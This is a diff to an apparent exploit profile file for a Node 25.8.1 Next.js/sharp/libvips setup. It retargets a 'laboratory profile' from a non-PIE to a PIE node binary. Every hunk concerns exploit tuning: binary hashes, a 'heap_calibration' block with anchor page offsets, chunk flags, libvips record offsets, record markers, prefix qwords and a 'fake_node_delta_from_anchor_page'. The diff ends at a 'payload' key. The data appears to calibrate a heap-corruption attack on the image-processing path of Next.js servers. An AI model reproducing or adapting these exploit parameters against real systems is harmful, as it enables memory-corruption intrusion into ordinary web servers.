@@ -1,9 +1,9 @@
 {
   "schema": 6,
-  "default_profile": "node-25.8.1-sharp-0.34.4-linux-x64",
+  "default_profile": "node-25.8.1-pie-sharp-0.34.4-linux-x64",
   "profiles": {
-    "node-25.8.1-sharp-0.34.4-linux-x64": {
-      "description": "Pinned KAN-2151 stock Next.js/sharp laboratory profile",
+    "node-25.8.1-pie-sharp-0.34.4-linux-x64": {
+      "description": "Pinned KAN-2159 PIE Node Next.js/sharp laboratory profile",
       "architecture": "x86_64",
       "packages": {
         "next": {
@@ -25,10 +25,10 @@
       },
       "node": {
         "version": "25.8.1",
-        "elf_type": "ET_EXEC",
+        "elf_type": "ET_DYN",
         "filename": "node",
-        "build_id": "36ff9f2b52694e1c5c56eb13a1acd5281a08edae",
-        "sha256": "b1d316a8ae095c4f4c159bb906bdd3e6a0ed6f7026a7a75dd00898f2cef24e41"
+        "build_id": "c52fa8d905d7eab79d16c17215f1618f1b8a4429",
+        "sha256": "4f068fde6d1856f5884072d086999e9ac82234139ddbd3157d15bd1c623e9f5c"
       },
       "libvips": {
         "version": "8.17.2",
@@ -107,25 +107,25 @@
         }
       },
       "heap_calibration": {
-        "record_variant": "marked_arena",
-        "selector_strategy": "response_record",
+        "record_variant": "pie_tail",
+        "selector_strategy": "profile_page_lane",
         "minimum_observations": 1,
         "anchor_rank": 0,
-        "scan_start": 0,
+        "scan_start": "0xe0000",
         "scan_end": 1048576,
         "anchor_alignment": "0x1000",
-        "anchor_page_offset_min": 0,
-        "anchor_page_offset_max": "0x1000",
-        "anchor_page_low16": 0,
+        "anchor_page_offset_min": "0xc00",
+        "anchor_page_offset_max": "0xf00",
+        "anchor_page_low16": "0x6000",
         "arena_alignment": "0x4000000",
         "arena_sentinel_offset": "0x98",
         "record_chunk_size_and_flags": "0x71",
-        "anchor_peer_delta": "0x4c0",
+        "anchor_peer_delta": "0x50",
         "related_pointer_delta_min": "0x60000",
         "related_pointer_delta_max": "0x70000",
         "libvips_record_offsets": ["0x33cd0f", "0x33de99", "0x1b8480"],
         "record_marker": "0x5b5b5b5b00000000",
-        "record_prefix_qwords": [],
+        "record_prefix_qwords": [0, "0x75", "0x8", "0x700000007", "0x200000002", 3],
         "fake_node_delta_from_anchor_page": "-0x690"
       },
       "payload": {
